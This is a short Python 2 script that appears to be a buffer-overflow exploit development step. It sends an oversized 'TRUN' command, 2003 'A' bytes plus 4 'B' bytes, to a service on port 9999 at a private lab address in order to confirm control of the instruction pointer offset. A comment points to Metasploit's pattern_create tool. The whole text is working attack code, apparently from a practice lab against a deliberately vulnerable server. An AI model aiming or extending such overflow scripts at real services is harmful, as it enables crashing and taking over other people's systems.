#!/usr/bin/python
import sys,socket

#./usr/share/metasploit-framwork/tools/exploit/pattern_create.rb -l 4100 <crashed at 4000 bytes>
shellcode = "A" * 2003 + "B" * 4

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('10.0.2.4',9999))
    s.send(('TRUN /.:/' + shellcode))
    s.close()

except:
    print "Error connecting to server"
    sys.exit()